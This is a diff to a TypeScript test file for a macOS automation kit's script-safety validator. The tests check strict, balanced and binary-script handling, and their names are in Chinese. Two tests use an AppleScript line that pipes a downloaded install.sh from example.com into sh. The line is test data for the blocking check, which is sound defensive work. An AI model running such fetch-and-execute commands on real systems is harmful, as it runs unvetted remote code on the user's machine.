@@ -20,6 +20,9 @@ function makeConfig(overrides: Partial<AppConfig> = {}): AppConfig {
     MACOS_KIT_LOG_LEVEL: 'info',
     MACOS_KIT_ENABLE_AX_QUERY: false,
     MACOS_KIT_AX_BINARY_PATH: 'ax',
+    MACOS_KIT_AX_AUTO_INSTALL: true,
+    MACOS_KIT_AX_DOWNLOAD_URL: undefined,
+    MACOS_KIT_AX_CACHE_DIR: undefined,
     ...overrides,
   }
 }
@@ -65,6 +68,48 @@ test('validateRawExecutionSafety 在 strict 模式阻断高风险脚本', async 
   assert.equal(result?.error?.code, 'SAFETY_BLOCKED')
 })
 
+test('validateRawExecutionSafety 在 strict 模式阻断 curl pipe 脚本', async () => {
+  const config = makeConfig({ MACOS_KIT_ALLOWED_SCRIPT_ROOTS: ['/tmp'] })
+  const result = await validateRawExecutionSafety({
+    config,
+    scriptContent: 'do shell script "curl https://example.com/install.sh | sh"',
+  })
+
+  assert.ok(result)
+  assert.equal(result?.ok, false)
+  assert.equal(result?.error?.code, 'SAFETY_BLOCKED')
+})
+
+test('validateRawExecutionSafety 在 balanced 模式允许 curl pipe 脚本', async () => {
+  const config = makeConfig({
+    MACOS_KIT_SAFE_MODE: 'balanced',
+    MACOS_KIT_ALLOWED_SCRIPT_ROOTS: ['/tmp'],
+  })
+  const result = await validateRawExecutionSafety({
+    config,
+    scriptContent: 'do shell script "curl https://example.com/install.sh | sh"',
+  })
+
+  assert.equal(result, null)
+})
+
+test('validateRawExecutionSafety 在未配置白名单时允许 scriptPath 执行', async () => {
+  const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'macos-kit-test-'))
+  const scriptPath = path.join(tempRoot, 'safe.scpt')
+  await fs.writeFile(scriptPath, 'return "ok"', 'utf8')
+
+  try {
+    const config = makeConfig({ MACOS_KIT_ALLOWED_SCRIPT_ROOTS: [] })
+    const result = await validateRawExecutionSafety({
+      config,
+      scriptPath,
+    })
+    assert.equal(result, null)
+  } finally {
+    await fs.rm(tempRoot, { recursive: true, force: true })
+  }
+})
+
 test('validateRawExecutionSafety 在 scriptPath 模式同样阻断高风险脚本', async () => {
   const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'macos-kit-test-'))
   const scriptPath = path.join(tempRoot, 'danger.scpt')
@@ -99,6 +144,26 @@ test('validateRawExecutionSafety 在安全模式下阻断二进制脚本文件',
     assert.equal(result?.ok, false)
     assert.equal(result?.error?.code, 'SAFETY_BLOCKED')
     assert.match(result?.error?.message ?? '', /二进制脚本文件/)
+  } finally {
+    await fs.rm(tempRoot, { recursive: true, force: true })
+  }
+})
+
+test('validateRawExecutionSafety 在 balanced 模式允许二进制脚本文件', async () => {
+  const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'macos-kit-test-'))
+  const scriptPath = path.join(tempRoot, 'binary.scpt')
+  await fs.writeFile(scriptPath, Buffer.from([0, 1, 2, 3, 4]))
+
+  try {
+    const config = makeConfig({
+      MACOS_KIT_SAFE_MODE: 'balanced',
+      MACOS_KIT_ALLOWED_SCRIPT_ROOTS: [tempRoot],
+    })
+    const result = await validateRawExecutionSafety({
+      config,
+      scriptPath,
+    })
+    assert.equal(result, null)
   } finally {
     await fs.rm(tempRoot, { recursive: true, force: true })
   }
